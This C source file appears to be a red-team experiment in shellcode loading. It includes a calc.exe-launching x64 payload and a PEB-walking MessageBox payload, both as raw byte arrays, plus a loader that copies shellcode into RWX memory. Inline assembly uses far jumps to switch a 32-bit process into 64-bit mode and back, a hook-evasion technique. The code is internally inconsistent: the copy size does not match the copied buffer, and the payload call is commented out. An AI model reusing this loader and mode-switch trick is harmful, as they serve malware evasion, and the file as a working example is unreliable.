#include <windows.h>
#include <stdio.h>
//jmp far 33:77D07009    //将32位模式切换成64位模式   再去执行ntdll的 syscall

//syscall32   jmp far 23:eip   返回32位模式


//unsigned char ShellCode[320] = {
//	0x60, 0x6A, 0x33, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x83, 0x04, 0x24, 0x07, 0xFF, 0x2C, 0x24, 0x90, //进入64位的代码
//	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
//	0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
//	0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
//	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
//	0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
//	0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
//	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
//	0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
//	0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
//	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
//	0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
//	0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
//	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,
//	0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,
//	0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
//	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
//	0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E,
//	0x65, 0x78, 0x65, 0x00, 
//	0xCC, 0x90, 0x90, 0x90,    //调试int 3
//	0xE8, 0x00, 0x00, 0x00, 0x00, 0x83, 0x04, 0x24, 0x0E, 0x66, 0xC7, 0x44, //返回32位的代码
//	0x24, 0x04, 0x23, 0x00, 0xFF, 0x2C, 0x24, 0x83, 0xC4, 0x10, 0x90, 0x90 
//};

//------------------------------------------------------------
//-----------       Created with 010 Editor        -----------
//------         www.sweetscape.com/010editor/          ------
//
// File    : C:\Users\ml\Desktop\calc.bin
// Address : 0 (0x0)
// Size    : 276 (0x114)
//------------------------------------------------------------
unsigned char ShellCode[276] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
	0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
	0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
	0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
	0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
	0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
	0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
	0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,
	0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
	0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E,
	0x65, 0x78, 0x65, 0x00
};

//------------------------------------------------------------
//-----------       Created with 010 Editor        -----------
//------         www.sweetscape.com/010editor/          ------
//
// File    : F:\work\ReadTeam\shellcode64\x64\Release\shellcode64.exe
// Address : 1024 (0x400)
// Size    : 1024 (0x400)
//------------------------------------------------------------
unsigned char hexData[1024] = {
	0x48, 0x83, 0xEC, 0x48, 0x48, 0x8D, 0x4C, 0x24, 0x28, 0xE8, 0x42, 0x00, 0x00, 0x00, 0xC6, 0x44,
	0x24, 0x20, 0x68, 0xC6, 0x44, 0x24, 0x21, 0x65, 0xC6, 0x44, 0x24, 0x22, 0x6C, 0xC6, 0x44, 0x24,
	0x23, 0x6C, 0xC6, 0x44, 0x24, 0x24, 0x6F, 0xC6, 0x44, 0x24, 0x25, 0x00, 0x45, 0x33, 0xC9, 0x4C,
	0x8D, 0x44, 0x24, 0x20, 0x48, 0x8D, 0x54, 0x24, 0x20, 0x33, 0xC9, 0xFF, 0x54, 0x24, 0x28, 0x48,
	0x83, 0xC4, 0x48, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC, 0x78, 0xC6, 0x44, 0x24, 0x38, 0x4D, 0xC6, 0x44,
	0x24, 0x39, 0x65, 0xC6, 0x44, 0x24, 0x3A, 0x73, 0xC6, 0x44, 0x24, 0x3B, 0x73, 0xC6, 0x44, 0x24,
	0x3C, 0x61, 0xC6, 0x44, 0x24, 0x3D, 0x67, 0xC6, 0x44, 0x24, 0x3E, 0x65, 0xC6, 0x44, 0x24, 0x3F,
	0x42, 0xC6, 0x44, 0x24, 0x40, 0x6F, 0xC6, 0x44, 0x24, 0x41, 0x78, 0xC6, 0x44, 0x24, 0x42, 0x41,
	0xC6, 0x44, 0x24, 0x43, 0x00, 0xC6, 0x44, 0x24, 0x48, 0x4C, 0xC6, 0x44, 0x24, 0x49, 0x6F, 0xC6,
	0x44, 0x24, 0x4A, 0x61, 0xC6, 0x44, 0x24, 0x4B, 0x64, 0xC6, 0x44, 0x24, 0x4C, 0x4C, 0xC6, 0x44,
	0x24, 0x4D, 0x69, 0xC6, 0x44, 0x24, 0x4E, 0x62, 0xC6, 0x44, 0x24, 0x4F, 0x72, 0xC6, 0x44, 0x24,
	0x50, 0x61, 0xC6, 0x44, 0x24, 0x51, 0x72, 0xC6, 0x44, 0x24, 0x52, 0x79, 0xC6, 0x44, 0x24, 0x53,
	0x41, 0xC6, 0x44, 0x24, 0x54, 0x00, 0xC6, 0x44, 0x24, 0x58, 0x47, 0xC6, 0x44, 0x24, 0x59, 0x65,
	0xC6, 0x44, 0x24, 0x5A, 0x74, 0xC6, 0x44, 0x24, 0x5B, 0x50, 0xC6, 0x44, 0x24, 0x5C, 0x72, 0xC6,
	0x44, 0x24, 0x5D, 0x6F, 0xC6, 0x44, 0x24, 0x5E, 0x63, 0xC6, 0x44, 0x24, 0x5F, 0x41, 0xC6, 0x44,
	0x24, 0x60, 0x64, 0xC6, 0x44, 0x24, 0x61, 0x64, 0xC6, 0x44, 0x24, 0x62, 0x72, 0xC6, 0x44, 0x24,
	0x63, 0x65, 0xC6, 0x44, 0x24, 0x64, 0x73, 0xC6, 0x44, 0x24, 0x65, 0x73, 0xC6, 0x44, 0x24, 0x66,
	0x00, 0xC6, 0x44, 0x24, 0x20, 0x75, 0xC6, 0x44, 0x24, 0x21, 0x73, 0xC6, 0x44, 0x24, 0x22, 0x65,
	0xC6, 0x44, 0x24, 0x23, 0x72, 0xC6, 0x44, 0x24, 0x24, 0x33, 0xC6, 0x44, 0x24, 0x25, 0x32, 0xC6,
	0x44, 0x24, 0x26, 0x00, 0xE8, 0x6E, 0x02, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8D,
	0x54, 0x24, 0x58, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0xE8, 0x03, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x8C,
	0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x89, 0x41, 0x10, 0x48, 0x8D, 0x54, 0x24, 0x48, 0x48, 0x8B,
	0x4C, 0x24, 0x28, 0x48, 0x8B, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0xFF, 0x50, 0x10, 0x48, 0x8B,
	0x8C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x89, 0x41, 0x08, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48,
	0x8B, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0xFF, 0x50, 0x08, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48,
	0x8D, 0x54, 0x24, 0x38, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0x48, 0x8B, 0x84, 0x24, 0x80, 0x00, 0x00,
	0x00, 0xFF, 0x50, 0x10, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x89, 0x01, 0x48,
	0x83, 0xC4, 0x78, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC, 0x18, 0x48, 0x8B,
	0x44, 0x24, 0x20, 0x48, 0x89, 0x04, 0x24, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x48, 0x89, 0x44, 0x24,
	0x08, 0x48, 0x8B, 0x44, 0x24, 0x08, 0x0F, 0xBE, 0x00, 0x85, 0xC0, 0x74, 0x4B, 0x48, 0x8B, 0x04,
	0x24, 0x0F, 0xBE, 0x00, 0x85, 0xC0, 0x74, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x08, 0x0F, 0xBE, 0x00,
	0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xBE, 0x09, 0x3B, 0xC1, 0x74, 0x13, 0x48, 0x8B, 0x04, 0x24, 0x0F,
	0xBE, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x08, 0x0F, 0xBE, 0x09, 0x2B, 0xC1, 0xEB, 0x2B, 0x48, 0x8B,
	0x44, 0x24, 0x08, 0x48, 0xFF, 0xC0, 0x48, 0x89, 0x44, 0x24, 0x08, 0x48, 0x8B, 0x04, 0x24, 0x48,
	0xFF, 0xC0, 0x48, 0x89, 0x04, 0x24, 0xEB, 0xA9, 0x48, 0x8B, 0x04, 0x24, 0x0F, 0xBE, 0x00, 0x48,
	0x8B, 0x4C, 0x24, 0x08, 0x0F, 0xBE, 0x09, 0x2B, 0xC1, 0x48, 0x83, 0xC4, 0x18, 0xC3, 0xCC, 0xCC,
	0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x8B,
	0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8B, 0x44, 0x24, 0x28,
	0x48, 0x63, 0x40, 0x3C, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C,
	0x24, 0x40, 0x8B, 0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x8B, 0x40,
	0x20, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x8B, 0x40, 0x24, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x8B, 0x40,
	0x1C, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x60, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF,
	0xC0, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x8B, 0x40, 0x18, 0x39, 0x44, 0x24,
	0x20, 0x73, 0x78, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0x8B, 0x04, 0x81, 0x48,
	0x8B, 0x4C, 0x24, 0x28, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x50, 0x48,
	0x8B, 0x94, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0xE8, 0x7F, 0xFE, 0xFF,
	0xFF, 0x85, 0xC0, 0x75, 0x41, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7,
	0x04, 0x41, 0x66, 0x89, 0x44, 0x24, 0x24, 0x0F, 0xB7, 0x44, 0x24, 0x24, 0x48, 0x8B, 0x4C, 0x24,
	0x60, 0x8B, 0x04, 0x81, 0x89, 0x44, 0x24, 0x38, 0x8B, 0x44, 0x24, 0x38, 0x48, 0x8B, 0x8C, 0x24,
	0x80, 0x00, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x68, 0x48,
	0x8B, 0x44, 0x24, 0x68, 0xEB, 0x07, 0xE9, 0x70, 0xFF, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x83, 0xC4,
	0x78, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x8B, 0xC1, 0x48, 0x03, 0xC2, 0xC3, 0x4D, 0x33, 0xC0, 0x48, 0x33, 0xC0, 0x4D, 0x33, 0xD2,
	0x49, 0x83, 0xC2, 0x60, 0x65, 0x49, 0x8B, 0x02, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x40, 0x10,
	0x48, 0x8B, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x8B, 0x40, 0x30, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};




void shellcode32to64(LPVOID lpCode64addr)
{
	unsigned long origin_esp = 0;
	DWORD x64code = NULL;
	__asm {
		mov origin_esp, esp
		and esp, 0xfffffff0

		push 033h; CS = 0x33时CPU对程序的地址空间解释为64位
		call push_eip
		push_eip :
		add[esp], 5
			retf

			; CPU进入64位模式
			sub esp, 040h; 从栈顶开一块空间
			; mov eax, lpCode64addr
			; call eax; 从此开始执行目标64位代码，最终返回这里

			x64 :
		_emit 48h
			_emit 0b8h
			_emit 90h
			_emit 78h
			_emit 56h
			_emit 34h
			_emit 12h
			_emit 00h
			_emit 00h
			_emit 00h
			; mov eax, 34567890h
			; mov origin_esp, eax
			add esp, 040h

			mov ecx, 02bh
			mov ss, cx

			call push_rip
			push_rip :
		mov dword ptr[esp + 4], 023h; CS = 0x23时CPU对程序的地址空间解释为32位
			add dword ptr[esp], 0dh
			retf

			; CPU回到32位模式
			mov esp, origin_esp


	}


}


int main()
{
	//__asm int 3;

	//__asm {
	//    push 33h
	//    call $+5
	//    add DWORD PTR [esp], 5
	//    retf 
	//    x64:
	//    mov eax, 0
	//}

	//ExitProcess(0);
	SIZE_T nSize = sizeof(ShellCode);
	LPVOID lpShellCodeAddr = VirtualAlloc(NULL, nSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(lpShellCodeAddr, hexData, nSize);
	printf("准备执行shellcode了\n");
	//system("pause");g
	//__asm int 3;
	shellcode32to64(lpShellCodeAddr);

	//((void(*)())lpShellCodeAddr)();
	system("pause");

	return 0;
}
